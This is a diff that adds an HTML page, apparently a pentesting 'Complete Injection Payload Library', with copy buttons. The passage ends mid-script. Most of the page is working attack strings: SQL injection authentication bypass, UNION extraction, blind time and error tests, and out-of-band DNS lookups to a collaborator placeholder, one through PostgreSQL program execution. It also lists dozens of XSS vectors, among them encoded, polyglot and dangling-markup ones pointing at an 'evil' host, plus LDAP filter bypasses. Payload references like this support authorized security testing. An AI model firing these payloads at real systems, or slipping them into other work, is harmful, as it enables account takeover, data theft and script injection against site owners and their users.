@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>CyberFriend | Complete Injection Payload Library</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Inter', sans-serif; background: #ffffff; color: #1e293b; line-height: 1.5; overflow-x: hidden; }
+  .video-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; overflow: hidden; }
+  .video-background video { min-width: 100%; min-height: 100%; width: auto; height: auto; position: absolute; top: 50%; left: 50%; opacity: 0.4; transform: translate(-50%, -50%); object-fit: cover; }
+  .video-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: -1; }
+  :root { --white: #ffffff; --offwhite: #f9fafb; --gray-50: #f8fafc; --gray-100: #f1f5f9; --gray-200: #e2e8f0; --gray-300: #cbd5e1; --gray-600: #475569; --gray-700: #334155; --gray-800: #1e293b; --gray-900: #0f172a; --green: #10b981; --green-dark: #059669; --blue: #3b82f6; --blue-dark: #2563eb; --grad: linear-gradient(135deg, #10b981, #3b82f6); --grad-hover: linear-gradient(135deg, #059669, #2563eb); --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05); --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03); --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.025); --border-light: 1px solid rgba(226, 232, 240, 0.5); }
+  h1, h2, h3, h4, h5, h6 { font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 700; letter-spacing: -0.02em; }
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: rgba(241, 245, 249, 0.5); }
+  ::-webkit-scrollbar-thumb { background: var(--green); border-radius: 10px; }
+  .navbar { position: fixed; top: 0; left: 0; right: 0; z-index: 1000; padding: 0 5%; transition: all 0.3s ease; background: transparent; }
+  .navbar.scrolled { background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px); border-bottom: var(--border-light); box-shadow: var(--shadow-sm); }
+  .nav-container { max-width: 1400px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; height: 70px; }
+  .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+  .nav-links { display: flex; list-style: none; gap: 2rem; align-items: center; }
+  .nav-links a { text-decoration: none; font-size: 0.9rem; font-weight: 500; color: var(--gray-700); transition: color 0.2s; }
+  .nav-links a:hover, .nav-links a.active { color: var(--green); }
+  .status-badge { background: rgba(16, 185, 129, 0.12); border: 1px solid rgba(16, 185, 129, 0.25); padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; color: var(--green-dark); display: flex; align-items: center; gap: 6px; }
+  .status-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.2); } }
+  .menu-btn { display: none; background: none; border: none; cursor: pointer; padding: 8px; }
+  .menu-btn span { display: block; width: 24px; height: 2px; background: var(--gray-800); margin: 5px 0; border-radius: 2px; }
+  .app-container { display: flex; padding-top: 70px; min-height: 100vh; }
+  .sidebar { width: 300px; background: transparent; border-right: var(--border-light); height: calc(100vh - 70px); position: sticky; top: 70px; overflow-y: auto; flex-shrink: 0; }
+  .logo-area { padding: 2rem 1.5rem 1.5rem; border-bottom: var(--border-light); text-align: center; }
+  .logo-icon-large { width: 80px; height: 80px; margin: 0 auto 1rem; }
+  .logo-icon-large img { width: 100%; height: 100%; object-fit: contain; }
+  .logo-title-img { height: 36px; width: auto; object-fit: contain; margin-bottom: 0.5rem; }
+  .logo-badge { font-size: 0.65rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--green); background: rgba(16, 185, 129, 0.1); padding: 0.2rem 0.8rem; border-radius: 20px; display: inline-block; }
+  .findings-header { padding: 1.5rem 1.5rem 0.5rem; font-size: 0.7rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--gray-600); display: flex; align-items: center; gap: 6px; }
+  .sidebar-category-list { padding: 0 1rem 1.5rem; }
+  .category-item { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(4px); border-radius: 12px; padding: 1rem; margin-bottom: 0.5rem; border: var(--border-light); transition: all 0.2s ease; cursor: pointer; }
+  .category-item:hover { background: white; transform: translateX(4px); border-color: var(--green); }
+  .category-title { font-weight: 600; font-size: 0.9rem; display: flex; justify-content: space-between; align-items: center; }
+  .category-count { background: rgba(16, 185, 129, 0.1); padding: 0.2rem 0.6rem; border-radius: 20px; font-size: 0.7rem; font-weight: 600; color: var(--green); }
+  .category-desc { font-size: 0.7rem; color: var(--gray-600); margin-top: 6px; }
+  .sidebar-footer { padding: 1rem 1.5rem 1.5rem; border-top: var(--border-light); color: var(--gray-600); font-size: 0.75rem; }
+  .main-content { flex: 1; overflow-y: auto; height: calc(100vh - 70px); }
+  .scroll-content { padding: 2rem; }
+  .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; gap: 1rem; flex-wrap: wrap; }
+  .search-wrapper { flex: 1; max-width: 360px; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(8px); border: var(--border-light); border-radius: 40px; padding: 0.1rem 0.1rem 0.1rem 1.2rem; display: flex; align-items: center; }
+  .search-wrapper:focus-within { border-color: var(--green); box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1); }
+  .search-wrapper input { background: transparent; border: none; padding: 0.7rem 0.8rem; font-size: 0.9rem; width: 100%; outline: none; font-family: 'Inter', sans-serif; }
+  .filter-badge { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(8px); border: var(--border-light); border-radius: 40px; padding: 0.4rem 1.2rem; font-size: 0.85rem; font-weight: 500; display: flex; align-items: center; gap: 6px; }
+  .container { max-width: 100%; margin: 0 auto; }
+  .warning-banner { background: #f59e0b; color: #000; padding: 15px; border-radius: 10px; margin-bottom: 30px; text-align: center; font-weight: 600; }
+  .category { background: rgba(255, 255, 255, 0.92); backdrop-filter: blur(8px); border-radius: 20px; padding: 20px; margin-bottom: 30px; border: var(--border-light); }
+  .category h2 { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: var(--border-light); font-size: 1.5rem; }
+  .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 15px; }
+  .payload-item { background: rgba(15, 23, 42, 0.05); border: var(--border-light); border-radius: 12px; padding: 15px; transition: all 0.3s ease; }
+  .payload-item:hover { border-color: var(--green); transform: translateY(-2px); box-shadow: var(--shadow-md); }
+  .payload-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+  .payload-name { font-weight: 600; color: var(--gray-800); }
+  .copy-btn { background: var(--grad); color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; transition: all 0.3s; }
+  .copy-btn:hover { background: var(--grad-hover); transform: scale(0.95); }
+  .copy-btn.copied { background: var(--green-dark); }
+  .payload-code { font-family: 'Courier New', monospace; font-size: 12px; color: var(--gray-700); background: rgba(0, 0, 0, 0.03); padding: 10px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+  .payload-desc { font-size: 11px; color: var(--gray-600); margin-top: 8px; font-style: italic; }
+  footer { text-align: center; margin-top: 40px; padding-top: 20px; border-top: var(--border-light); color: var(--gray-600); font-size: 14px; }
+  .notification { position: fixed; top: 20px; right: 20px; background: var(--green-dark); color: white; padding: 12px 20px; border-radius: 8px; font-weight: 600; box-shadow: var(--shadow-lg); display: none; z-index: 1000; animation: slideIn 0.3s ease; }
+  @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+  @media (max-width: 900px) { .sidebar { display: none; } .menu-btn { display: block; } .nav-links { display: none; position: fixed; top: 70px; left: 0; right: 0; background: white; flex-direction: column; padding: 2rem; gap: 1.5rem; box-shadow: var(--shadow-lg); border-bottom: var(--border-light); z-index: 999; } .nav-links.open { display: flex; } .payload-grid { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body>
+<div class="video-background"><video autoplay muted loop playsinline id="bgVideo"><source src="background.mp4" type="video/mp4"></video></div>
+<div class="video-overlay"></div>
+<nav class="navbar" id="navbar"><div class="nav-container"><a href="#" class="logo"></a><button class="menu-btn" id="menuBtn"><span></span><span></span><span></span></button><ul class="nav-links" id="navLinks"><li><a href="#">Tools</a></li><li><a href="https://web-scanner-codestark.onrender.com/">Scanner</a></li><li><a href="#" class="active">Payloads</a></li><li><a href="#">Reports</a></li><li><span class="status-badge"><span class="status-dot"></span> Complete Library</span></li></ul></div></nav>
+<div class="app-container"><aside class="sidebar"><div class="logo-area"><div class="logo-icon-large"><img src="solo_logo.jpeg" alt="CyberFriend" onerror="this.style.display='none';"></div><img src="company_text.jpeg" alt="CyberFriend" class="logo-title-img" onerror="this.style.display='none';"><div class="logo-badge">COMPLETE PAYLOAD LIBRARY</div></div><div class="findings-header"><i class="fas fa-folder"></i> PAYLOAD TYPES</div><div class="sidebar-category-list"><div class="category-item" data-filter="xss"><div class="category-title"><span><i class="fas fa-code"></i> XSS Payloads</span><span class="category-count">150+</span></div><div class="category-desc">Complete XSS vectors - encoded safe</div></div><div class="category-item" data-filter="sqli"><div class="category-title"><span><i class="fas fa-database"></i> SQL Injection</span><span class="category-count">35+</span></div><div class="category-desc">String concat, substring, comments, delays, DNS</div></div><div class="category-item" data-filter="ldap"><div class="category-title"><span><i class="fas fa-address-book"></i> LDAP Injection</span><span class="category-count">7</span></div><div class="category-desc">Directory access bypass</div></div></div><div class="sidebar-footer"><i class="fas fa-circle" style="color: var(--green); font-size: 0.5rem;"></i> copy-safe · encoded display</div></aside>
+<main class="main-content"><div class="scroll-content"><div class="top-bar"><div class="search-wrapper"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Search payloads..."></div><div class="filter-badge"><i class="fas fa-copy"></i> <span id="visibleCount">190+ payloads</span></div></div><div class="warning-banner">⚠️ FOR AUTHORIZED TESTING ONLY — All payloads displayed as HTML encoded, copy as raw plain text</div><div class="container">
+
+<!-- SQL INJECTION SECTION - COMPLETE -->
+<div class="category" id="sqli-category"><h2>🗃️ SQL Injection Payloads - Complete Reference</h2><div class="payload-grid" id="sqli-payloads">
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle String Concat</div><button class="copy-btn">Copy</button></div><div class="payload-code">'foo'||'bar'</div><div class="payload-desc">Oracle string concatenation operator</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL String Concat</div><button class="copy-btn">Copy</button></div><div class="payload-code">'foo'+'bar'</div><div class="payload-desc">Microsoft SQL Server concatenation</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL Concat</div><button class="copy-btn">Copy</button></div><div class="payload-code">'foo'||'bar'</div><div class="payload-desc">PostgreSQL concatenation</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Space Concat</div><button class="copy-btn">Copy</button></div><div class="payload-code">'foo' 'bar'</div><div class="payload-desc">MySQL space concatenation</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL CONCAT Function</div><button class="copy-btn">Copy</button></div><div class="payload-code">CONCAT('foo','bar')</div><div class="payload-desc">MySQL CONCAT() function</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle SUBSTR</div><button class="copy-btn">Copy</button></div><div class="payload-code">SUBSTR('foobar',4,2)</div><div class="payload-desc">Oracle substring extraction</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL SUBSTRING</div><button class="copy-btn">Copy</button></div><div class="payload-code">SUBSTRING('foobar',4,2)</div><div class="payload-desc">Microsoft SQL Server substring</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL SUBSTRING</div><button class="copy-btn">Copy</button></div><div class="payload-code">SUBSTRING('foobar',4,2)</div><div class="payload-desc">PostgreSQL substring</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL SUBSTRING</div><button class="copy-btn">Copy</button></div><div class="payload-code">SUBSTRING('foobar',4,2)</div><div class="payload-desc">MySQL substring</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle Comment</div><button class="copy-btn">Copy</button></div><div class="payload-code">--comment</div><div class="payload-desc">Oracle/PostgreSQL comment</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL Comment</div><button class="copy-btn">Copy</button></div><div class="payload-code">/*comment*/</div><div class="payload-desc">Microsoft SQL Server comment</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Hash Comment</div><button class="copy-btn">Copy</button></div><div class="payload-code">#comment</div><div class="payload-desc">MySQL hash comment</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Double Dash</div><button class="copy-btn">Copy</button></div><div class="payload-code">-- comment</div><div class="payload-desc">MySQL double dash with space</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle Version</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT banner FROM v$version</div><div class="payload-desc">Oracle database version</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL Version</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT @@version</div><div class="payload-desc">Microsoft SQL Server version</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL Version</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT version()</div><div class="payload-desc">PostgreSQL version</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Version</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT @@version</div><div class="payload-desc">MySQL version</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle Time Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">dbms_pipe.receive_message(('a'),10)</div><div class="payload-desc">Oracle 10 second delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL Time Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">WAITFOR DELAY '0:0:10'</div><div class="payload-desc">MS SQL 10 second delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL Time Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT pg_sleep(10)</div><div class="payload-desc">PostgreSQL 10 second delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Time Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT SLEEP(10)</div><div class="payload-desc">MySQL 10 second delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle Conditional Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT CASE WHEN (YOUR-CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</div><div class="payload-desc">Oracle conditional time delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL Conditional Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">IF (YOUR-CONDITION) WAITFOR DELAY '0:0:10'</div><div class="payload-desc">MS SQL conditional delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL Conditional Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT CASE WHEN (YOUR-CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END</div><div class="payload-desc">PostgreSQL conditional delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Conditional Delay</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT IF(YOUR-CONDITION,SLEEP(10),'a')</div><div class="payload-desc">MySQL conditional delay</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle Conditional Error</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</div><div class="payload-desc">Oracle conditional error</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL Conditional Error</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT CASE WHEN (YOUR-CONDITION) THEN 1/0 ELSE NULL END</div><div class="payload-desc">MS SQL conditional error</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL Conditional Error</div><button class="copy-btn">Copy</button></div><div class="payload-code">1 = (SELECT CASE WHEN (YOUR-CONDITION) THEN 1/(SELECT 0) ELSE NULL END)</div><div class="payload-desc">PostgreSQL conditional error</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL Conditional Error</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tables),'a')</div><div class="payload-desc">MySQL conditional error</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Oracle DNS Lookup</div><button class="copy-btn">Copy</button></div><div class="payload-code">SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</div><div class="payload-desc">Oracle DNS exfiltration</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MS SQL DNS Lookup</div><button class="copy-btn">Copy</button></div><div class="payload-code">exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</div><div class="payload-desc">MS SQL DNS lookup</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">PostgreSQL DNS Lookup</div><button class="copy-btn">Copy</button></div><div class="payload-code">copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</div><div class="payload-desc">PostgreSQL DNS exfiltration</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">MySQL DNS Lookup</div><button class="copy-btn">Copy</button></div><div class="payload-code">LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</div><div class="payload-desc">MySQL DNS (Windows only)</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Basic Auth Bypass</div><button class="copy-btn">Copy</button></div><div class="payload-code">' OR '1'='1</div><div class="payload-desc">Basic authentication bypass</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Union Based Extraction</div><button class="copy-btn">Copy</button></div><div class="payload-code">1' UNION SELECT NULL, version(), user()--</div><div class="payload-desc">Union-based data extraction</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Stacked Query</div><button class="copy-btn">Copy</button></div><div class="payload-code">QUERY-1-HERE; QUERY-2-HERE</div><div class="payload-desc">Batched stacked queries</div></div>
+</div></div>
+
+<!-- XSS SECTION - COMPLETE -->
+<div class="category" id="xss-category"><h2>🛡️ XSS Payloads - Complete Reference (Encoded Safe)</h2><div class="payload-grid" id="xss-payloads"></div></div>
+
+<!-- LDAP SECTION -->
+<div class="category" id="ldap-category"><h2>📋 LDAP Injection Payloads</h2><div class="payload-grid" id="ldap-payloads">
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Wildcard Bypass</div><button class="copy-btn">Copy</button></div><div class="payload-code">*)(&amp;)</div><div class="payload-desc">Basic wildcard injection</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Always True</div><button class="copy-btn">Copy</button></div><div class="payload-code">(&amp;(user=*))</div><div class="payload-desc">Always true condition</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Admin Bypass</div><button class="copy-btn">Copy</button></div><div class="payload-code">admin*)(uid=*))(|(uid=*</div><div class="payload-desc">Admin authentication bypass</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Object Class</div><button class="copy-btn">Copy</button></div><div class="payload-code">admin)(&amp;(objectClass=*))</div><div class="payload-desc">Object class injection</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Single Wildcard</div><button class="copy-btn">Copy</button></div><div class="payload-code">*</div><div class="payload-desc">Simple wildcard match all</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">CN Injection</div><button class="copy-btn">Copy</button></div><div class="payload-code">*)(&amp;(cn=admin))</div><div class="payload-desc">Common name injection</div></div>
+<div class="payload-item"><div class="payload-header"><div class="payload-name">Password Bypass</div><button class="copy-btn">Copy</button></div><div class="payload-code">)(&amp;(userPassword=*))(|(uid=*</div><div class="payload-desc">Password field injection</div></div>
+</div></div>
+
+<footer>Complete Injection Payload Library • SQL, XSS, LDAP • For Authorized Security Testing Only</footer></div></div></main></div>
+<div class="notification" id="notification">✅ Payload copied to clipboard!</div>
+
+<script>
+const xssPayloads = [
+{name:"Basic Script Tag",code:"&lt;script&gt;alert('XSS')&lt;/script&gt;",desc:"Basic script tag injection"},
+{name:"Quote Break",code:"\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;",desc:"Breaks out of attribute quotes"},
+{name:"Image Error",code:"&lt;img src=x onerror=alert(1)&gt;",desc:"Uses image onerror event"},
+{name:"SVG Load",code:"&lt;svg/onload=alert('XSS')&gt;",desc:"SVG onload event"},
+{name:"Body Load",code:"&lt;body onload=alert('XSS')&gt;",desc:"Body onload event"},
+{name:"JavaScript URL",code:"javascript:alert('XSS')",desc:"JavaScript protocol in URLs"},
+{name:"IFrame",code:"&lt;iframe src=\"javascript:alert(1)\"&gt;",desc:"IFrame with JavaScript source"},
+{name:"Object Tag",code:"&lt;object data=\"javascript:alert(1)\"&gt;",desc:"Object tag injection"},
+{name:"onanimationcancel",code:"&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;xss id=x style=\"position:absolute;\" onanimationcancel=\"print()\"&gt;&lt;/xss&gt;",desc:"CSS animation cancel event"},
+{name:"onanimationend",code:"&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;xss style=\"animation-name:x\" onanimationend=\"alert(1)\"&gt;&lt;/xss&gt;",desc:"CSS animation end event"},
+{name:"onanimationiteration",code:"&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"&gt;&lt;/xss&gt;",desc:"CSS animation iteration event"},
+{name:"onanimationstart",code:"&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"&gt;&lt;/xss&gt;",desc:"CSS animation start event"},
+{name:"onbeforeprint",code:"&lt;body onbeforeprint=console.log(1)&gt;",desc:"Before print event"},
+{name:"onbegin",code:"&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;",desc:"SVG animation begin"},
+{name:"oncanplay",code:"&lt;audio oncanplay=alert(1)&gt;&lt;source src=\"validaudio.wav\" type=\"audio/wav\"&gt;&lt;/audio&gt;",desc:"Audio can play event"},
+{name:"onend",code:"&lt;svg&gt;&lt;animate onend=alert(1) attributeName=x dur=1s&gt;",desc:"SVG animation end"},
+{name:"onerror",code:"&lt;audio src/onerror=alert(1)&gt;",desc:"Resource load error"},
+{name:"onfocus",code:"&lt;a id=x tabindex=1 onfocus=alert(1)&gt;&lt;/a&gt;",desc:"Element focus event"},
+{name:"onload",code:"&lt;body onload=alert(1)&gt;",desc:"Page load event"},
+{name:"onmessage",code:"&lt;body onmessage=print()&gt;",desc:"Message event"},
+{name:"onpageshow",code:"&lt;body onpageshow=alert(1)&gt;",desc:"Page show event"},
+{name:"onpopstate",code:"&lt;body onpopstate=print()&gt;",desc:"History popstate"},
+{name:"onresize",code:"&lt;body onresize=\"print()\"&gt;",desc:"Window resize event"},
+{name:"onscroll",code:"&lt;body onscroll=alert(1)&gt;&lt;div style=height:1000px&gt;&lt;/div&gt;",desc:"Scroll event"},
+{name:"ontoggle",code:"&lt;details ontoggle=alert(1) open&gt;test&lt;/details&gt;",desc:"Details toggle event"},
+{name:"onclick",code:"&lt;xss onclick=\"alert(1)\" style=display:block&gt;test&lt;/xss&gt;",desc:"Click event"},
+{name:"oncontextmenu",code:"&lt;xss oncontextmenu=\"alert(1)\" style=display:block&gt;test&lt;/xss&gt;",desc:"Right click context menu"},
+{name:"ondblclick",code:"&lt;xss ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block&gt;test&lt;/xss&gt;",desc:"Double click event"},
+{name:"onkeydown",code:"&lt;xss onkeydown=\"alert(1)\" contenteditable style=display:block&gt;test&lt;/xss&gt;",desc:"Key down event"},
+{name:"onmouseover",code:"&lt;xss onmouseover=\"alert(1)\" style=display:block&gt;test&lt;/xss&gt;",desc:"Mouse over event"},
+{name:"onwheel",code:"&lt;body onwheel=alert(1)&gt;",desc:"Mouse wheel event"},
+{name:"No parentheses exception",code:"&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;",desc:"Exception handling XSS"},
+{name:"No parentheses using location",code:"&lt;script&gt;location='javascript:alert\\x281\\x29'&lt;/script&gt;",desc:"Location redirect XSS"},
+{name:"Template strings",code:"&lt;script&gt;alert`1`&lt;/script&gt;",desc:"Template literal XSS"},
+{name:"Iframe JavaScript protocol",code:"&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;",desc:"Iframe protocol XSS"},
+{name:"Anchor JavaScript protocol",code:"&lt;a href=\"javascript:alert(1)\"&gt;XSS&lt;/a&gt;",desc:"Anchor protocol XSS"},
+{name:"Data protocol script",code:"&lt;script src=\"data:text/javascript,alert(1)\"&gt;&lt;/script&gt;",desc:"Data URI XSS"},
+{name:"SVG script href",code:"&lt;svg&gt;&lt;script href=\"data:text/javascript,alert(1)\" /&gt;",desc:"SVG script XSS"},
+{name:"Form action",code:"&lt;form action=javascript:alert(1)&gt;&lt;input type=submit value=XSS&gt;&lt;/form&gt;",desc:"Form action XSS"},
+{name:"Button formaction",code:"&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;XSS&lt;/button&gt;&lt;/form&gt;",desc:"Button formaction XSS"},
+{name:"Srcdoc iframe",code:"&lt;iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"&gt;&lt;/iframe&gt;",desc:"Srcdoc iframe XSS"},
+{name:"UTF-7 Meta",code:"&lt;meta charset=\"UTF-7\" /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-",desc:"UTF-7 charset XSS"},
+{name:"Unicode escapes",code:"&lt;script&gt;\\u0061lert(1)&lt;/script&gt;",desc:"Unicode escape XSS"},
+{name:"Hex encoding",code:"&lt;script&gt;eval('\\x61lert(1)')&lt;/script&gt;",desc:"Hex encoding XSS"},
+{name:"Octal encoding",code:"&lt;script&gt;eval('\\141lert(1)')&lt;/script&gt;",desc:"Octal encoding XSS"},
+{name:"HTML entities in SVG",code:"&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;",desc:"HTML entity XSS"},
+{name:"Base64 data URI",code:"&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;",desc:"Base64 data URI XSS"},
+{name:"VueJS Template",code:"{{constructor.constructor('alert(1)')()}}",desc:"VueJS template injection"},
+{name:"AngularJS Sandbox",code:"{{constructor.constructor('alert(1)')()}}",desc:"AngularJS sandbox escape"},
+{name:"Consuming noscript tag",code:"&lt;noscript&gt;&lt;img title=\"&lt;/noscript&gt;&lt;img src onerror=alert(1)&gt;\"&gt;&lt;/noscript&gt;",desc:"Noscript consuming tag"},
+{name:"Consuming style tag",code:"&lt;style&gt;&lt;img title=\"&lt;/style&gt;&lt;img src onerror=alert(1)&gt;\"&gt;&lt;/style&gt;",desc:"Style consuming tag"},
+{name:"Consuming script tag",code:"&lt;script&gt;&lt;img title=\"&lt;/script&gt;&lt;img src onerror=alert(1)&gt;\"&gt;&lt;/script&gt;",desc:"Script consuming tag"},
+{name:"Dangling markup img",code:"&lt;img src=\"//evil?&gt;",desc:"Dangling markup attack"},
+{name:"Dangling markup iframe",code:"&lt;iframe src=\"//evil?&gt;",desc:"Dangling markup iframe"},
+{name:"Polyglot payload",code:"javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;",desc:"Universal polyglot XSS"}
+];
+
+function htmlEncode(str) { return str.replace(/[&<>]/g, function(m) { if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m; }).replace(/"/g, '&quot;'); }
+
+function renderXSS() {
+    const container = document.getElementById('xss-payloads');
+    container.innerHTML = '';
+    xssPayloads.forEach(p => {
+        const div = document.createElement('div'); div.className = 'payload-item';
+        div.innerHTML = `<div class="payload-header"><div class="payload-name">${htmlEncode(p.name)}</div><button class="copy-btn" data-raw="${htmlEncode(p.code).replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/&quot;/g, '"')}">Copy</button></div><div class="payload-code">${p.code}</div><div class="payload-desc">${htmlEncode(p.desc)}</div>`;
+        container.appendChild(div);
+    });
+}
+
+function attachCopyEvents() {
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.removeEventListener('click', handleCopy);
+        btn.addEventListener('click', handleCopy);
